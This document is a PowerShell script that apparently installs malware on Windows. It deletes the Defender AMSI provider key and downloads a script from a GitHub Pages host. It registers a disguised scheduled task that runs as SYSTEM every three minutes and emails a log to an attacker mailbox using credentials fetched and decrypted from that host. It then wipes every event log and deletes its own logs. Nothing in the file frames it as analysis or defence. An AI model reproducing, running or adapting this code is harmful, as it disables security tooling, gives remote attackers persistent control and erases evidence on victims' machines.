
[CmdletBinding(SupportsShouldProcess)]
param()
$fname=(new-guid).Guid
$fname = $fname.substring(0,20)
$FullLogs = ""
$LogFilePath="$env:Temp\$fname.001"

Function OutString
{
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$Msg,
        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [ValidateSet('Information','Warning','Error')]
        [string]$Severity = 'Information'
    )

    if($env:COMPUTERNAME -like 'MAVERICK') {
          if($TestOutput){
            write-host '[install]   ' -NoNewLine -f Red
            write-host $Msg -f DarkYellow
         }
        Write-Verbose $Msg
    }
    [pscustomobject]@{
        Time = (Get-Date -f g)
        Message = $Message
        Severity = $Severity
    } | Export-Csv -Path $LogFilePath -Append -NoTypeInformation
    $FullLogs = $FullLogs + $Msg + '`n`n'
}


function Set-Key {
param([string]$string)
$length = $string.length
$pad = 32-$length
if (($length -lt 16) -or ($length -gt 32)) {Throw "String must be between 16 and 32 characters"}
$encoding = New-Object System.Text.ASCIIEncoding
$bytes = $encoding.GetBytes($string + "0" * $pad)
return $bytes
}

Function Decrypt-String($EncryptedString,$Passphrase)
{
    $EncryptionKey=Set-Key $Passphrase
    Try{
        $SecureString = ConvertTo-SecureString $EncryptedString -Key $EncryptionKey
        $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureString)
        [string]$String = [Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
        [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)

        Return $String
    }
    Catch{Throw $_}

}

Function Send-InstallNotification
{
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$subject,
        [string]$msgbody,
        [string]$file=""
    )
    try {
        $SecMFile='https://vr972be716a04eb6.github.io/dat/mail.dat'
        $SecPFile='https://vr972be716a04eb6.github.io/dat/ps.dat'
        $webclient = New-Object Net.WebClient
        $CmdData = $webclient.DownloadString($SecMFile)

        $Pass = $webclient.DownloadString($SecPFile)
        $Pass = $Pass.substring(0,30)
        $Pass.length
        $decrypted=Decrypt-String $CmdData $Pass
        $CharArray =$decrypted.Split(";")

        $EmailFrom = $CharArray[0]
        $EmailTo = $CharArray[1]
        $pass = $CharArray[2]

        $message = new-object System.Net.Mail.MailMessage 
        $message.From = $EmailFrom 
        $message.To.Add($EmailTo)
        $message.IsBodyHtml = $True 
        $message.Subject = $subject 

        if($file -ne ""){
          if(Test-Path -Path $file){
              $attachment = $file
              $attach = new-object Net.Mail.Attachment($attachment) 
              $message.Attachments.Add($attach)   
          }
        }
        $message.body = $msgbody
        $SMTPServer = "smtp.gmail.com"
        $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
        $SMTPClient.EnableSsl = $true
        $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom, $pass);
        $SMTPClient.Send($message)
    }
    catch
    {
        $Msg="Ran into an issue: $($PSItem.ToString())"
        #write-host '[test-exceptions] ' -NoNewLine -f Red
        #write-host $Msg -f DarkYellow
        write-verbose $Msg 
        if($PSCmdlet -ne $null){
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
        
    }   
}


function ConvertTo-EncodedScript
{
  param
  (
    [string]$Path,
    [switch]$WriteFile=$false
  )
  
  $Code = Get-Content -Path $Path -Raw
  $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Code) 
  $Base64 = [Convert]::ToBase64String($Bytes) 
  
  if($WriteFile){
      $NewPath = [System.IO.Path]::ChangeExtension($Path, '.b64')
      $Base64 | Set-Content -Path $NewPath
  }

  return $Base64
}

Function New-ScheduledTaskFolder
{
  Param ($taskpath)
  $ErrorActionPreference = "stop"

  OutString "New-ScheduledTaskFolder called with path $taskpath"


  $scheduleObject = New-Object -ComObject schedule.service
  $scheduleObject.connect()
  $rootFolder = $scheduleObject.GetFolder("\")
  Try 
  {
    $null = $scheduleObject.GetFolder($taskpath)
  }
  Catch { 
    $null = $rootFolder.CreateFolder($taskpath) 
  }
  Finally { 
    $ErrorActionPreference = "continue" 
  } 
}

function Install-EncodedScriptTask {
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$TaskName,
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$EncodedTask
    )

    $Interval=3

    OutString "Install-EncodedScriptTask called with taskname $TaskName. Code: $EncodedTask"


    $action = New-ScheduledTaskAction -Execute "C:\Temp\ImportantProgram.exe"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes $Interval)
    $principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -Priority 3
    $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings

    $null=Register-ScheduledTask $TaskName -InputObject $task
    $null=Start-ScheduledTask -TaskName $TaskName
}


function RemoveOldTasks
{
    $ErrorActionPreference = "SilentlyContinue"
    $Report = @()
    $NumTasks = 0
    $path = "c:\Windows\System32\Tasks"
    $tasks = Get-ChildItem -recurse -Path $path -File
    foreach ($task in $tasks)
    {
        $Details = "" | select Task, IsHidden, Enabled, Application
        $AbsolutePath = $task.directory.fullname + "\" + $task.Name
        $TaskInfo = [xml](Get-Content $AbsolutePath)
        #$Details.ComputerName = $Computer
        $Details.Task = $task.name
        $Details.IsHidden = $TaskInfo.task.settings.hidden
        $Details.Enabled = $TaskInfo.task.settings.enabled
        $Details.Application = $TaskInfo.task.actions.exec.command

        $CreationDate=[datetime]$TaskInfo.CreationTime
        $LimitDate= (get-date).AddDays(-7)
        if($CreationDate -gt  $LimitDate) 
        {
            $Report += $Details
            $NumTasks = $NumTasks + 1
        }
    }  


    if($NumTasks -gt 0){
        OutString "Cleanup: Found $NumTasks Tasks Created in the last 7 days"
        foreach ($tdel in $Report){
            $tname=$tdel.Task
            OutString "Cleanup: Deleting task $tname "
            #Unregister-ScheduledTask 'RemoteExecCheck' -ErrorAction Ignore
        }
    }            
} 

function Cleanup {

  # old tasks
  OutString "Cleanup: Unregister RemoteExecCheck,ScheduledSecurityCheck,WinSecurityScheduledCheck"
  Unregister-ScheduledTask 'RemoteExecCheck' -ErrorAction Ignore
  Unregister-ScheduledTask 'WinSecurityScheduledCheck' -ErrorAction Ignore
  Unregister-ScheduledTask 'ScheduledSecurityCheck' -ErrorAction Ignore

  $NewTaskFolder='ComObjectsRegistrationManagement'
  $NewTaskName=$NewTaskFolder + '\' + 'ComObjectsRegistrar'
  Unregister-ScheduledTask $NewTaskName -ErrorAction Ignore
  RemoveOldTasks
  # logs
  OutString "Clera Logs"
  $null=Get-WinEvent -ListLog * -Force | % { Wevtutil.exe cl $_.LogName }

  Remove-Item -Path "$env:Temp\LogFile.csv" -Force -ErrorAction Ignore
  Remove-Item -Path $LogFilePath -Force -ErrorAction Ignore
}

# AMSI
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse -Force -ErrorAction Ignore 

$NewTaskFolder='ComObjectsRegistrationManagement'
$NewTaskName=$NewTaskFolder + '\' + 'ComObjectsRegistrars'
New-ScheduledTaskFolder $NewTaskFolder

$InstallFromLocal=$false

$currentPath = Get-Location
$script_clear = ''
if($InstallFromLocal)
{
    $script_clear = Join-Path $currentPath "runat5min.ps1"
    $script_coded = ConvertTo-EncodedScript $script_clear $false
    $c64data = get-content $script_coded -Raw
    Install-EncodedScriptTask $NewTaskName $c64data
} else {
      OutString "ScriptUrl: $ScriptUrl"
      $ScriptUrl='https://vr972be716a04eb6.github.io/schdtask/rpt.dat'
      $webclient = New-Object Net.WebClient
      $ClearScript = $webclient.DownloadString($ScriptUrl)
      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($ClearScript) 
      $Base64 = [Convert]::ToBase64String($Bytes) 
      OutString "EncodedScript(downloaded): $EncodedScript"
      Install-EncodedScriptTask $NewTaskName $Base64
}

Send-InstallNotification "Schd Task Install Notice for $env:COMPUTERNAME" "test again, check file" $LogFilePath
Cleanup
